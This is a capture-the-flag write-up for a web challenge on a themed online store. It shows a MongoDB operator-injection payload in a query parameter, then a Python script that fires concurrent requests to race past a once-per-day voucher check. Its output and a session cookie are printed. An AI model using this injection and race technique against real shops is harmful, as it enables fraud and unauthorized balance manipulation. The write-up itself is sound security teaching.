## SPEED - srdnlen CTF - web (50)

-------------

--------------


This web app is a Pixar Cars themed online store.

There are multiple functions on the page:

1. registering account
2. logging in
3. shopping sweet cars memorabilia
4. checking your cart
5. redeeming a voucher

The app is JSON based and we there is cookie usage for sessions.

We are provided with the app.js and routes.js file. After analyzing these files, the objective or task at hand is to find some way to get more discount codes so that we can buy the 4th item: "Lightning McQueen's Secret Text" for 50 points.

With this, we need to further analyze the discount code functions/routes. In app.js, not much is given to us except that the codes are randomly created and inserted into a mongoDB. Next we need to see how routes.js handles user input for the redeem gift card function.

From this snippet of code we see that no input validation is performed for the gift card redeem:

```
router.get('/redeem', isAuth, async (req, res) => {
    try {
        const user = await User.findById(req.user.userId);

        if (!user) {
            return res.render('error', { Authenticated: true, message: 'User not found' });
        }

        // Now handle the DiscountCode (Gift Card)
        let { discountCode } = req.query;
        
        if (!discountCode) {
            return res.render('error', { Authenticated: true, message: 'Discount code is required!' });
        }

        const discount = await DiscountCodes.findOne({discountCode})
```

From here, we take our knowledge of the backend MongoDB and lack of input validation to craft a NoSQL injection into the discountCode paramter through burpsuite:

```
/redeem?discountCode[$ne]=null
```

By appending [$ne]=null to the discountCode paramter, the backend MongoDB query turns int:

```
DiscountCodes.findOne({ discountCode: { $ne: null } });
```

The $ne means not equal and { $ne: null } tells MongoDB to match any document where the discount code is not null.



------------


We do this 3 times to get enough money to purchase the sweet Lightning McQueen text and get our flag for this challenge!

Not so quick, the discount codes can only be used once a day based on the following code:

```
// Check if the voucher has already been redeemed today
        const today = new Date();
        const lastRedemption = user.lastVoucherRedemption;

        if (lastRedemption) {
            const isSameDay = lastRedemption.getFullYear() === today.getFullYear() &&
                              lastRedemption.getMonth() === today.getMonth() &&
                              lastRedemption.getDate() === today.getDate();
            if (isSameDay) {
                return res.json({success: false, message: 'You have already redeemed your gift card today!' });
            }
        }

        // Apply the gift card value to the user's balance
        const { Balance } = await User.findById(req.user.userId).select('Balance');
        user.Balance = Balance + discount.value;
        // Introduce a slight delay to ensure proper logging of the transaction 
        // and prevent potential database write collisions in high-load scenarios.
        new Promise(resolve => setTimeout(resolve, delay * 1000));
        user.lastVoucherRedemption = today;
        await user.save();

        return res.json({
            success: true,
            message: 'Gift card redeemed successfully! New Balance: ' + user.Balance // Send success message
        });
```

There is a delay function when the codes are redeemed, so if we force the system to process multiple codes for one user at the same instance or under the delay threshold we should be able to redeem multiple codes. This is an example of a race conditions vulnerability.

To exploit this vulnerability, I make a python script that will send many requests with the above payload so that I can bypass the time of day check:

```
import requests
from concurrent.futures import ThreadPoolExecutor

# Define the URL and headers
url = "http://speed.challs.srdnlen.it:8082/redeem"
headers = {
    "Host": "speed.challs.srdnlen.it:8082",
    "Accept-Language": "en-US,en;q=0.9",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
    "Accept": "*/*",
    "Referer": "http://speed.challs.srdnlen.it:8082/redeemVoucher",
    "Accept-Encoding": "gzip, deflate, br",
    "Cookie": "jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NzhlODZlOGQ4YjZmYzFkNTNlZmI3NjAiLCJpYXQiOjE3MzczOTM4OTcsImV4cCI6MTczNzQyOTg5N30.B6tFcK_ayKshfkfRDKYA3q9GnjZzkA6BTWSeW1_NxrY",
    "Connection": "keep-alive",
}

# Define the query parameters
params = {
    "discountCode[$ne]": "null"
}

# Function to send a single request
def redeem_code():
    response = requests.get(url, headers=headers, params=params)
    print(response.json())

# Exploit by sending multiple concurrent requests
with ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(redeem_code) for _ in range(10)]

# Check the responses to see if multiple redemptions occurred
```

The results:

```
{'success': True, 'message': 'Gift card redeemed successfully! New Balance: 20'}
{'success': True, 'message': 'Gift card redeemed successfully! New Balance: 40'}
{'success': False, 'message': 'You have already redeemed your gift card today!'}
{'success': False, 'message': 'You have already redeemed your gift card today!'}
{'success': True, 'message': 'Gift card redeemed successfully! New Balance: 60'}
{'success': False, 'message': 'You have already redeemed your gift card today!'}
{'success': False, 'message': 'You have already redeemed your gift card today!'}
{'success': False, 'message': 'You have already redeemed your gift card today!'}
{'success': False, 'message': 'You have already redeemed your gift card today!'}
{'success': False, 'message': 'You have already redeemed your gift card today!'}
```

When I go back to my browser to check my balance:

----------


From here, we can buy the Secret Text item and get our flag:


-------



#### Materials used

https://portswigger.net/web-security/nosql-injection
https://portswigger.net/web-security/race-conditions
